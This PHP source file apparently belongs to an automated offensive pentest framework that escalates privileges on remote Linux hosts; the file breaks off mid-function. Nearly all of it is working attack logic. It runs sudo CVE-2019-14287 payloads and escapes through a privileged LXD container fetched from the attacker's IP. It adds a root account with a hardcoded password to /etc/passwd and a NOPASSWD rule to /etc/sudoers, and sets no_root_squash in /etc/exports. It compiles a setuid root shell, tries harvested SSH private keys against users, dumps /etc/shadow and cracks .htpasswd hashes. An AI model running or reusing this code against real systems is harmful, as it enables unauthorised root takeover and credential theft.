<?php

class check4linux8misc extends check4linux8enum{
    var $tab_authorized_keys_hosts ;
    var $tab_private_keys ;
    
    var $created_user_name;
    var $created_user_pass;

    
    /*
     * 
  https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh
  
    
 
     * 
     */
    public function __construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64) {
        parent::__construct($eth,$domain,$ip,$port,$protocol,$stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64);
        $this->created_user_name = "syslog_admin";
        $this->created_user_pass = "admin123456789";
    }
    
    
    public function misc2writable_files(){
        $this->ssTitre(__FUNCTION__);
        // https://www.hackingarticles.in/multiple-ways-to-get-root-through-writable-file/
    }
    
    public function misc2readable_files(){
        $this->ssTitre(__FUNCTION__);
        
    }
    
    public function misc2exec_files(){
        $this->ssTitre(__FUNCTION__);
    }
    
    public function misc2sudo8CVE_2019_14287(){
        $this->ssTitre(__FUNCTION__);
        $template_id_euid = "sudo -u#-1 %ID% -u ";
        if (!$this->ip2root8db($this->ip2id))  $this->lan2pentest8id($template_id_euid);
        $template_id_euid = "sudo -u#4294967295 %ID% -u ";
        if (!$this->ip2root8db($this->ip2id))  $this->lan2pentest8id($template_id_euid);
    }
    
    public function misc2sudo(){
        $this->ssTitre("can we sudo without supplying a password");
        $template_id_euid = "sudo -l -k %ID% 2>/dev/null";
        $this->lan2pentest8id($template_id_euid);
    }
    
    public function misc2container(){
        $this->titre(__FUNCTION__);
        $this->misc2container2lxd();
        $this->misc2container2docker();
    }
    
    
    public function misc2container2docker(){
        $this->ssTitre(__FUNCTION__);
        // https://www.hackingarticles.in/docker-installation-configuration/
        
        $this->note("specific checks - check to see if we're in a docker container");
        
        $data = "docker ps";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "grep -i docker /proc/self/cgroup  2>/dev/null; find / -name \"*dockerenv*\" -exec ls -la {} \; 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("specific checks - check to see if we're a docker host");
        $data = "docker --version 2>/dev/null; docker ps -a 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("specific checks - are we a member of the docker group");
        $data = "id | grep -i docker 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("specific checks - are there any docker files present");
        $data = "find / -name Dockerfile -o -name docker-compose.yml -exec ls -l {} 2>/dev/null \;";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("specific checks - are we in an lxd/lxc container");
        $data = "grep -qa container=lxc /proc/1/environ 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("specific checks - are we a member of the lxd group");
        $data = "id | grep -i lxd 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
    }
    
    public function misc2container2lxd(){
        $this->ssTitre(__FUNCTION__);
        /*
         wget http://cloud-images.ubuntu.com/xenial/current/xenial-server-cloudimg-amd64-root.tar.xz
wget http://cloud-images.ubuntu.com/xenial/current/xenial-server-cloudimg-amd64-lxd.tar.xz
lxc image import xenial-server-cloudimg-amd64-lxd.tar.xz rootfs xenial-server-cloudimg-amd64-root.tar.xz --alias SomeAlias
lxc launch SomeAlias MyMachine
         */
        $attacker_ip = $this->ip4addr4target($this->ip);

        

        
        $file_path = "$this->dir_tmp/xenial-server-cloudimg-amd64-root.tar.xz";
        $query = "cp -v $this->dir_tools/lan/linux/xenial-server-cloudimg-amd64-root.tar.xz $file_path";
        if (!file_exists($file_path)) $this->requette($query);
        $data = "wget http://$attacker_ip:$this->port_rfi/xenial-server-cloudimg-amd64-root.tar.xz ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $file_path = "$this->dir_tmp/xenial-server-cloudimg-amd64-lxd.tar.xz";
        $query = "cp -v $this->dir_tools/lan/linux/xenial-server-cloudimg-amd64-lxd.tar.xz $file_path";
        if (!file_exists($file_path)) $this->requette($query);
        $data = "wget http://$attacker_ip:$this->port_rfi/xenial-server-cloudimg-amd64-lxd.tar.xz ";
        $this->lan2stream4result($data,$this->stream_timeout);
               
        $data = "lxc image import xenial-server-cloudimg-amd64-lxd.tar.xz rootfs xenial-server-cloudimg-amd64-root.tar.xz --alias SomeAlias";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "lxc list";
        $this->lan2stream4result($data,$this->stream_timeout);
                
        $data = "lxc init SomeAlias test -c security.privileged=true";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "lxc config device add test whatever disk source=/ path=/mnt/root recursive=true ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "lxc start test";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "lxc exec test bash ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $template_id_euid = "lxc exec test bash -c %ID%";
        $this->lan2pentest8id($template_id_euid);
        
        
        
        $data = "lxc launch SomeAlias MyMachine";
        //$this->lan2stream4result($data,$this->stream_timeout);
        

    }
    
    
    
    public function misc(){
        $this->titre(__FUNCTION__);

        
        if (!$this->ip2root8db($this->ip2id))  $this->misc2keys();$this->pause();
        return 0;
        
        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_sudoers();$this->pause();
        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_exports();$this->pause();
        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_shadow();$this->pause();
        if (!$this->ip2root8db($this->ip2id))  $this->misc2sudo();$this->pause();
        if (!$this->ip2root8db($this->ip2id))  $this->misc2sudo8CVE_2019_14287();$this->pause();       
        if (!$this->ip2root8db($this->ip2id))  $this->misc2writable_files();$this->pause();
        if (!$this->ip2root8db($this->ip2id))  $this->misc2readable_files();$this->pause();
        if (!$this->ip2root8db($this->ip2id))  $this->misc2container();$this->pause();
        if (!$this->ip2root8db($this->ip2id))  $this->misc2keys();$this->pause();
        if (!$this->ip2root8db($this->ip2id))  $this->misc4passwd();$this->pause();
    }
    
    

    
    
    
    public function misc2etc_shadow(){
        $this->ssTitre(__FUNCTION__);
        $filename = "/etc/shadow";
        $obj_filename = new FILE($filename);
        
        
        
        if ($this->lan2file4readable($obj_filename->file_path)){
        
        $data = "grep -v -e '^$' /etc/passwd | grep ':'  | grep -v '^#' | sort -u 2>/dev/null";
        
        $lines_passwd = $this->lan2stream4result($data,$this->stream_timeout);
        $lines_passwd_str = $this->requette("echo \"$lines_passwd\"  | grep -v 'CMD:' ");
        $result .= $lines_passwd;
        
        $data = "grep -v -e '^$' /etc/shadow /etc/shadow~ | grep ':'  | grep -v '^#' | sort -u 2>/dev/null ";
        
        $lines_shadow = $this->lan2stream4result($data,$this->stream_timeout);
        $lines_shadow_str = $this->requette("echo \"$lines_shadow\"  | grep -v 'CMD:' ");
        $result .= $lines_shadow;
        
        
        if(!empty($lines_shadow_str)) {
            $this->lan2root8shadow($lines_shadow_str, $lines_passwd_str);  
        }
        }

    }
     
    public function lan2bin4syscall($lan_bin_path){
        $this->ssTitre(__FUNCTION__);
        $strace_bin_rst = array();
        $lan_bin_path = trim($lan_bin_path);
        $data = "strace -s 9999 -v -f $lan_bin_path 2>&1 | grep -i 'execve(' | grep \"execve(\\\"/bin/sh\\\", \\\[\\\"sh\\\", \\\"-c\\\"\\\,\" | grep -Po \"execve\\\(\\\"/bin/sh\\\", \\\[\\\"sh\\\", \\\"-c\\\"\\\, \\\"[a-z]{2,}\\\"\\\]\\\,\"";
        $strace_bin = trim($this->lan2stream4result($data,$this->stream_timeout*3));
        if (preg_match('#execve\(\"/bin/sh\", \[\"sh\", \"-c\", \"(?<syscall>[[:print:]]{2,})\"\],#',$strace_bin,$strace_bin_rst))
        {
            if (isset($strace_bin_rst['syscall'])){
                $this->article("SysCall",$strace_bin_rst['syscall']);
                return $strace_bin_rst['syscall'];
            }
        }
        else {
            $this->note("Not found execve into $lan_bin_path");
            return "";
        }
    }
    
    
    public function misc2user8pass($username,$userpass,$ssh_port){
        $this->ssTitre(__FUNCTION__);
        $username = trim($username);
        $userpass = trim($userpass);
        $ssh_port = trim($ssh_port);
        
        $template_id_euid = "echo -e \"ssh $username@127.0.0.1 -p $ssh_port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C '%ID%' <<#$userpass\n> /dev/tty\nls > /dev/tty\n#\" | bash ";

        $this->lan2pentest8id($template_id_euid);
        //===============================================================
    }
    
    
    public function misc2user8key($username,$remote_privkey_path,$ssh_port){
        $this->ssTitre(__FUNCTION__);
        $username = trim($username);
        $remote_privkey_path = trim($remote_privkey_path);
        $ssh_port = trim($ssh_port);

        $template_id_euid = "ssh -i $remote_privkey_path  $username@127.0.0.1 -p $ssh_port -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null -C '%ID%' ";

        $this->lan2pentest8id($template_id_euid);
        //===============================================================
    }

 
    
    public function misc2keys2authorized_keys_file($authorized_keys_filepath){
        $this->ssTitre(__FUNCTION__);
        //===============================================================

            if (!empty($authorized_keys_filepath)){
                $query = "cat $authorized_keys_filepath";
                $authorized_keys_str = trim($this->req_ret_str($query));
                $stream = $this->stream ;
                $local_username = "";
                $local_home_user = "";
                $ip2users = $this->ip2users4passwd();
                foreach ($ip2users as $remote_username => $remote_userpass)
                    $this->service4authorized_keys($stream, $authorized_keys_filepath, $authorized_keys_str, $remote_username, $remote_userpass, $local_username, $local_home_user);
            
        }
        //===============================================================
        
    }
    
    
    public function misc2keys4authorized_keys_file(){
        $this->ssTitre(__FUNCTION__);
        //===============================================================
        $data = "find /home/ -name \"authorized_keys\" -exec ls -la {} 2>/dev/null \;";
        $this->lan2stream4result($data,$this->stream_timeout*3);
        
        $data = "find /home -iname \"authorized_keys\" -type f -exec cat {} \; 2>/dev/null ";
        $authorized_keys_filepath = $this->req_ret_str("echo '".$this->lan2stream4result($data,$this->stream_timeout*3)."' | grep 'authorized_keys' ");
        $public_key_ssh_rsa_file_tab_remote = explode("\n",$authorized_keys_filepath);
        $this->pause();
        
        foreach ($public_key_ssh_rsa_file_tab_remote as $authorized_keys_filepath){
           $this->misc2keys2authorized_keys_file($authorized_keys_filepath);
        }
        //===============================================================
        
    }
    

    
    public function misc2keys4add(){
        $this->ssTitre(__FUNCTION__);
        $tab_home = array();
        $this->note("home user");
        $data = "ls -l /home/* 2>/dev/null ";
        $rst_home = $this->lan2stream4result($data,$this->stream_timeout);
        exec("echo '$rst_home' | grep ':' | cut -d':' -f1 $this->filter_file_path ",$tab_home);
        $tab_home = array("/home/nightfall");
        if (isset($tab_home[0])){
            foreach ($tab_home as $home_user){
                $home_user = trim($home_user);
                if (!empty($home_user)) $this->misc2keys2add($home_user);
            }
        }
        
    }
    
    public function misc2keys2add($home_user){
        $this->ssTitre(__FUNCTION__);
        $remote_username = "";
        $tmp = array();
        $this->article("home user",$home_user);
        $authorized_keys_filepath = "";
        $authorized_keys_str = "";
        $query = "echo '$home_user' | sed \"s#/home/##g\"  ";
        exec($query,$tmp);
        if (isset($tmp[0])) $remote_username = trim($tmp[0]);
        if (!empty($remote_username)) $this->service4authorized_keys($this->stream, $authorized_keys_filepath, $authorized_keys_str, $remote_username, "", $remote_username, $home_user);
        
        
    }
    
    public function misc2keys4info(){
        $this->ssTitre(__FUNCTION__);
        //===============================================================
        $data = "ls -alR ~/.ssh ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("Can private-key information be found?");
        $data = "ls /home/*\/.ssh/*";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "grep -v -e '^$' /etc/ssh/config ";
        $this->lan2stream4result($data,$this->stream_timeout);       
        
        $data = "grep -v -e '^$' /etc/ssh/ssh_config | grep -v \"^#\"";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "grep 'PubkeyAuthentication' /etc/ssh/ssh_config ";
        $this->lan2stream4result($data,$this->stream_timeout);

        $this->note("checks for if various ssh files are accessible");
        $data = "find / \( -name \"*_dsa\" -o -name \"*_rsa\" -o -name \"known_hosts\" -o -name \"authorized_hosts\" -o -name \"authorized_keys\" \) -exec ls -la {} 2>/dev/null \;";
        $this->lan2stream4result($data,$this->stream_timeout*3);
        
        $data = "grep \"PermitRootLogin\" /etc/ssh/sshd_config 2>/dev/null | grep -v \"#\" ";
        $check_root_acces = trim($this->lan2stream4result($data,$this->stream_timeout));
        if(stristr($check_root_acces,"PermitRootLogin yes")!==FALSE) $this->log2succes("Yes Root Access is Permited",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"IP:$this->ip PORT:$this->port","");
        if(stristr($check_root_acces,"PermitRootLogin no")!==FALSE) $this->note("Root Access is Not Permited");
        
        
    }

  
    
    public function misc2keys4users(){
        $this->titre(__FUNCTION__);
        $tab_privkeys = array();
        
        $ssh_port = $this->ip2port4service("ssh");
        if (empty($ssh_port)) $ssh_port = "22" ;
        
        $data = "find / \( -name \"id_dsa\" -o -name \"id_rsa\" -o -name \"ssh_host_key\" -o -name \"ssh_host_rsa_key\" -o -name \"ssh_host_dsa_key\" -o -name \"identity\"  \) -exec ls {} 2>/dev/null \;";
        $tmp = $this->lan2stream4result($data,$this->stream_timeout*3);
        
        $command = "echo '$tmp' | grep -i -Po \"^(/[a-z0-9\-\_\.]{1,})*\" | sort -u ";
        exec($command,$tab_privkeys);
        $this->article("All Priv Keys Location", $this->tab($tab_privkeys));
        if (!empty($tab_privkeys)){
            foreach ($tab_privkeys as $remote_privkey_path){
                $remote_privkey_path = trim($remote_privkey_path);
                foreach ($this->tab_users_shell as $username)
                    if (!empty($username)) $this->misc2user8key($username, $remote_privkey_path, $ssh_port);
            }

        }
    }
    
    
    
    
    public function misc2keys(){
        $this->titre(__FUNCTION__);
        $this->misc2keys4users();$this->pause(); // OK 
        $this->misc2keys4info();$this->pause();        
        $this->misc2keys4authorized_keys_file();$this->pause();
        
    }
    
    
    
    public function misc4passwd(){
        
        $this->titre(__FUNCTION__);
        $this->note("Grep hardcoded passwords");
        $this->note("Is there anything in the log file(s)");
        $data = "grep -i pass /var/log/*log 2>/dev/null";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        $result .= $lines;
        $this->pause();
        
        $data = "find / -type f -iname  \"*.php\" -exec grep -i -E \"(passwd|password|user|root|pass)\"   {} \; | grep -v \"#\"   2>/dev/null ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("Any of the service(s) settings misconfigured ? Are any (vulnerable) plugins attached?");
        $data = "find / -type f -iname  \"*.config\" -exec grep -i -E \"(passwd|password|user|root)\"  {} \;  | grep -v \"#\"  | grep -v \"^;\" 2>/dev/null ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $data = "find / -type f -iname  \"*.conf\" -exec grep -i -E \"(passwd|password|user)\"   {}  \;  | grep -v \"#\"  | grep -v \"^;\" 2>/dev/null ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $data = "find / -type f -iname  \"*.cfg\" -exec grep -i -E \"(passwd|password|user|root)\"   {} \;  | grep -v \"#\"  | grep -v \"^;\" 2>/dev/null ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("password policy information as stored in /etc/login.defs");
        $data = "grep \"^PASS_MAX_DAYS|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD\" /etc/login.defs 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $data = "ps -eo args --user 0 --no-headers ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        
        $data = "cat ~/.profile  | grep -v '^#' | sort -u 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "cat /var/mail/root";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "cat /var/spool/mail/root";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "btmp";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "wtmp";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "udev";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "messages";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "syslog";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "debug";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "boot";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->ssTitre("looks for hidden files");
        $data = "find / -name \".*\" -type f ! -path \"/proc/*\" ! -path \"/sys/*\" -exec ls -al {} \; 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "dmesg | grep -i -E \"(segfault|root|passw)\" ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        $this->note("OpenBSD");
        $data = "grep -v -e '^$' /etc/master.passwd  | grep -v '^#'  2>/dev/null ";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        $result .= $lines;
        $this->pause();
        
        $data = "grep -r -i pass /var/www/* 2>/dev/null";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        $result .= $lines;
        $this->pause();
        
        
        $this->note("htpasswd check");
        $users_pass_htpasswd = array();
        $data = "find / -name .htpasswd -print -exec cat {} \; 2>/dev/null  | grep ':' | sort -u";
        $users_pass_found = trim($this->lan2stream4result($data,$this->stream_timeout));
        $result .= $users_pass_found ;
        $this->article("ALL USERS FOUND", $users_pass_found);
        if(!empty($users_pass_found)){
            $tmp_users = array();
            $tmp_pass = array();
            
            exec("echo '$users_pass_found' | grep ':' > $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd   ");
            if (!file_exists("$this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd.pot")) $this->requette("john $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd --pot=$this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd.pot --fork=12 --wordlist:\"$this->dico_password\" ");
            $result .= $this->req_ret_str("john --show $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd");
            $tab_user2pass = $this->req_ret_tab("cat $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd 2> /dev/null | grep ':' ");
            
            if (!empty($tab_user2pass)){
                foreach ($tab_user2pass as $user2tmp){
                    //if (preg_match('/(?<user2name>\w+)\:(?<user2cpw>\w+)\:(?<user2uid>\d+)\:(?<user2gid>\d+)\:(?<user2full_name>\w+)\:(?<user2home>\w+)\:(?<user2shell>\w+)/',$line,$user))
                    if(!empty($user2tmp)){
                        $auth_user2name = $this->req_ret_str("echo '$user2tmp' | cut -d':' -f1 ");
                        $auth_user2name = trim($auth_user2name);
                        $this->article("USER NAME", $auth_user2name);
                        $auth_user2pass = $this->req_ret_str("echo '$user2tmp' | cut -d':' -f2 ");
                        $auth_user2pass = trim($auth_user2pass);
                        $this->article("USER PASSWORD", $auth_user2pass);
                        
                        if(!empty($auth_user2name)) $result .= $this->yesAUTH($this->port2id, $auth_user2name, $auth_user2pass,NULL,NULL,NULL,NULL,NULL,"crack $this->vm_tmp_lin/$this->ip.$this->port.$this->protocol.htpasswd with john ", $this->ip2geoip());
                    }
                }
            }
            
            
            
            exec("echo '$users_pass_found' | grep ':' | cut -d ':' -f1   ",$tmp_users);
            exec("echo '$users_pass_found' | grep ':' | cut -d ':' -f2   ",$tmp_pass);
            if( !empty($tmp_users)) $users_pass_htpasswd += [ $tmp_users[0] => $tmp_pass[0] ];
            unset($tmp_users);unset($tmp_pass);
        }
        $users_pass_htpasswd = array_unique(array_map("trim",$users_pass_htpasswd));
        foreach ($users_pass_htpasswd as $user_htpasswd_name => $user_htpasswd_pass ){
            if (!empty($user_htpasswd_name)){
                
                $result .= $this->article("User", $user_htpasswd_name);
                $result .= $this->article("PASS", $user_htpasswd_pass);
            }
        }
        $this->pause();
        return $result;
    }
    
    public function misc2etc_passwd2crackpass($username2avoid,$etc_passwd_lanpath){
        
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $chaine = "Encrypted password: The ':x:' denotes encrypted password which is actually stored inside /shadow file. 
If the user does not have a password, then the password field will have an *(asterisk).";
        $this->note($chaine);
        $data = "grep ':*:' $etc_passwd_lanpath 2>/dev/null";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        $this->article("Users with NoPassword", $lines);
        if (!empty($lines)) $users_nopasswd = explode('\n', $lines);
        
        $data = "grep -v '^[^:]*:[x]' $etc_passwd_lanpath 2>/dev/null | grep -v '$username2avoid' ";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("checks to see if any hashes are stored in /etc/passwd (depreciated  *nix storage method)");
        $data = "grep -v '^[^:]*:[x]' $etc_passwd_lanpath 2>/dev/null";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        
        return $result;
    }
    
    public function misc2etc_passwd2add($username,$userpass,$etc_passwd_lanpath){
        
        $result = "";
        $this->ssTitre(__FUNCTION__);
        $username = trim($username);
        $userpass = trim($userpass);
        $etc_passwd_lanpath = trim($etc_passwd_lanpath);
        
        $obj_filename = new FILE($etc_passwd_lanpath);
        
        $user = $this->created_user_name;
        $query = "mkpasswd -m SHA-512 $userpass";
        $user_pass_crypt = trim($this->req_ret_str($query));
        $query = "openssl passwd -1 -salt $userpass";
        $user_pass_crypt = trim($this->req_ret_str($query));
        $query = "openssl passwd -1 -salt $username $userpass";
        $user_pass_crypt = trim($this->req_ret_str($query));
        $this->article("user_pass_crypt",$user_pass_crypt);
        $search = $user.':'.$user_pass_crypt.':0:0:root:/root:/bin/sh';
        
        if ($this->lan2file4writable($obj_filename->file_path)){
            if (!$this->lan2file4search($obj_filename->file_path, $search)){
                $result .= $this->lan2file4add($obj_filename->file_path, $search);
            }
            //$result .= $this->stream4root($this->stream);
            $result .= $this->stream8ssh8passwd($this->ip,$this->port,$this->created_user_name, $userpass);
        }
        return $result;
    }
    
    
    public function misc2etc_passwd2nopasswd($username2avoid,$etc_passwd_lanpath){
        
        $result = "";
        $this->ssTitre(__FUNCTION__);
        
        return $result;
    }
    
    public function misc2etc_passwd(){
        $this->ssTitre(__FUNCTION__);
        // https://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/
        
        $etc_passwd_lanpath = "/etc/passwd";
        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_passwd2nopasswd($this->created_user_name, $etc_passwd_lanpath);        
        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_passwd2crackpass($this->created_user_name, $etc_passwd_lanpath);
        if (!$this->ip2root8db($this->ip2id))  $this->misc2etc_passwd2adduser($this->created_user_name, $this->created_user_pass,$etc_passwd_lanpath);
        
        
        return $result;
   }
    
    
    public function misc2etc_sudoers(){
        $this->ssTitre(__FUNCTION__);
        $etc_sudoers_path = "/etc/sudoers";
        $obj_filename = new FILE($etc_sudoers_path);
        $search = "$this->uid_name ALL=(ALL:ALL) NOPASSWD:ALL";
        
        if ($this->lan2file4writable($obj_filename->file_path)){
            if (!$this->lan2file4search($obj_filename->file_path, $search)){
                $this->lan2file4add($obj_filename->file_path, $search);
            }
            $this->users4root($this->uid_name, '');
        }
    }
    
  
    
    
    
 
    
    public function misc2etc_exports2setsuid($mount_rhost_path){
        $this->ssTitre(__FUNCTION__);
        $this->article("LD_PRELOAD Exploit","This attack involves .so files (part of the dynamic link library) being used by programs.
        The attacker can add a program pretending to be one of these libraries so that when a program is
        run it will execute the program pretending to be a library, this is useful if you are calling
        a program that has the suid bit set to root, this. 
        So when the program is first run, it will attempt to load the library it requires
        (but it has been replaced with code the attacker wants executed) and thus runs the commands
        in the program placed by the attacker, with the permissions of the owner of the calling program.");
        $suid = <<<EOC
        #include <stdio.h>
        #include <sys/types.h>
        #include <unistd.h>
        int main(void){
        setuid(0);
        setgid(0);
        seteuid(0);
        setegid(0);
        execvp("/bin/sh", NULL, NULL);
        // execl("/bin/sh","sh",(char*)0);
        }
EOC;
        $data = "echo '$suid' > $this->vm_tmp_lin/suid.c ";
        //$this->lan2stream4result($data,$this->stream_timeout);
        $this->req_ret_str($data);
        
        $this->pause();
        
        $data = "gcc -m32 -o $this->vm_tmp_lin/suid $this->vm_tmp_lin/suid.c ";
        //$this->lan2stream4result($data,$this->stream_timeout);
        $this->req_ret_str($data);
        
        $this->pause();
        
        $data = "chmod u+s $this->vm_tmp_lin/suid ";
        //$this->lan2stream4result($data,$this->stream_timeout);
        $this->req_ret_str($data);
        
        $data = "ls -al $this->vm_tmp_lin/suid ";
        //$this->lan2stream4result($data,$this->stream_timeout);
        $this->req_ret_str($data);
        
        $this->pause();
        
        $data = "chmod 4755 $this->vm_tmp_lin/suid ";
        //$this->lan2stream4result($data,$this->stream_timeout);
        $this->req_ret_str($data);
        
        $data = "ls -al $this->vm_tmp_lin/suid";
        //$this->lan2stream4result($data,$this->stream_timeout);
        $this->req_ret_str($data);
        
        $this->pause();
        
        $data = "mount $mount_rhost_path /tmp";
        $result .= $this->req_ret_str($data);
        $this->pause();
        
        $template_id_euid = "$this->vm_tmp_lin/suid %ID%";

        $this->lan2pentest8id($template_id_euid);

        $this->pause();
        
        $result .= $this->users4root($this->created_user_name, $this->created_user_pass);
        
    }
    
    
    public function misc2etc_exports(){
        /*
         https://www.hackingarticles.in/linux-privilege-escalation-using-misconfigured-nfs/
         https://guide.offsecnewbie.com/privilege-escalation/linux-pe
         
         Look for vulnerable/privileged components such as: mysql, sudo, udev, python
         
         
         If there is a cronjob that runs as run but it has incorrect file permissions, you can change it to run your SUID binary and get a shell.
         
         The following command will list processes running by root, permissions and NFS exports.
         
         $ echo 'services running as root'; ps aux | grep root;  echo 'permissions'; ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'; echo 'nfs info'; ls -la /etc/exports 2>/dev/null; grep -v -e '^$' /etc/exports 2>/dev/null
         
         NFS
         
         cp $shell /mnt/<share>
         chmod 4777 bash
         ./bash -p
         
         
         $result .= $this->rouge("No root");
         $cmd = "grep -v -e '^$' /etc/exports | grep -v \"#\" | sed \"s/,root_squash/,no_root_squash/g\"  ";
         
         
         NFS Share
         If you find that a machine has a NFS share you might be able to use that to escalate privileges if it's misconfigured.
         Check if the target machine has any NFS shares:
         
         showmount -e [host]
         
         If it does, then mount it to your filesystem:
         mount [host]:/ /tmp/
         
         If that succeeds then you can go to /tmp/share and look for interesting files. Test if you can create files, then check with your low-priv shell what user has created that file. If it says root has created the file, then you can create a file and set it with suid-permission from your attacking machine, then execute it with your low privilege shell.
         This code can be compiled and added to the share. Before executing it by your low-priv user make sure to set the SUID-bit on it, like this:
         bash
         chmod 4777 exploit
         #include <stdio.h>
         #include <stdlib.h>
         #include <sys/types.h>
         #include <unistd.h>
         
         int main()
         {
         setuid(0);
         system("/bin/bash");
         return 0;
         }
         
         
         */
        $result = "";
        $this->ssTitre(__FUNCTION__);
        
        $this->note("How are file-systems mounted?");
        $data = "mount";
        $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "cat /proc/mounts";
        $lines = $this->lan2stream4result($data,$this->stream_timeout);
        
        $this->note("Provides a list of mounted file systems.
Can be used to determine where other interesting files might be located");
        $data = "cat /proc/mounts";
        $this->lan2stream4result($data,$this->stream_timeout);
        

        
        $this->note("If /etc/exports if writable, you can add an NFS entry or change and existing entry adding the no_root_squash flag to a root directory, put a binary with SUID bit on, and get root.");
        $data = "grep -v -e '^$' /etc/exports | grep -v \"#\"  2> /dev/null ";
        $result .= $this->lan2stream4result($data,$this->stream_timeout);
        
        $data = "grep -v -e '^$' /etc/exports | grep -v \"#\" | sed \"s/,root_squash/,no_root_squash/g\"  2> /dev/null ";
        $result .= $this->lan2stream4result($data,$this->stream_timeout);
        
        $etc_sudoers_path = "/etc/exports";
        $obj_filename = new FILE($etc_sudoers_path);
        $whoami = $this->lan2whoami();
        
        $search_data = '/  *(rw, no_root_squash)';
        if ($this->lan2file4writable($obj_filename->file_path)){
            if (!$this->lan2file4search($obj_filename->file_path, $search_data)){
                $result .= $this->lan2file4add($obj_filename->file_path, $search_data);
                $result .= $this->misc2etc_exports2setsuid("/");
            }
            $result .= $this->users4root($whoami, '');
        }
        
        
      

        
        return $result;
    }
    
    
    
    
    
    
    public function users(){
        $this->titre(__FUNCTION__);
        $users_passwd = $this->ip2users4passwd();
        $tab_users_shell = $this->ip2users4shell();
        foreach ($users_passwd as $user2name => $user2pass){
            if (!empty($user2name))
                if (!$this->ip2root8db($this->ip2id)) {
                    if (!$this->ip2root8db($this->ip2id)) $this->users4root($user2name,$user2pass);
                    if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath($this->users2sudoers2list($user2name, $user2pass));
                    
                    foreach ($tab_users_shell as $user2name_shell)
                        if (!$this->ip2root8db($this->ip2id)) {
                            if (!$this->ip2root8db($this->ip2id)) $this->users4root($user2name_shell,$user2pass);
                            if (!$this->ip2root8db($this->ip2id)) $this->users2sudoers8filepath($this->users2sudoers2list($user2name_shell, $user2pass));
                        }
                }
        }
        $this->pause();
        
    }
    
    
    
    
    
    public function users2sudoers2list($user_name,$user_pass){
        $this->titre("Linux Privilege Escalation using Sudo Rights");
        $this->ssTitre("sudo -l – Prints the commands which we are allowed to run as SUDO ");
        $data = "echo '$user_pass' | sudo -l -S -U '$user_name' "; // su --login '$user_name'
        return $this->lan2stream4result($data,$this->stream_timeout*3);
    }
    
    
    
    
    
    
    public function users2sudoers8filepath($sudoers_str){
        $result = "";
        $this->ssTitre(__FUNCTION__);
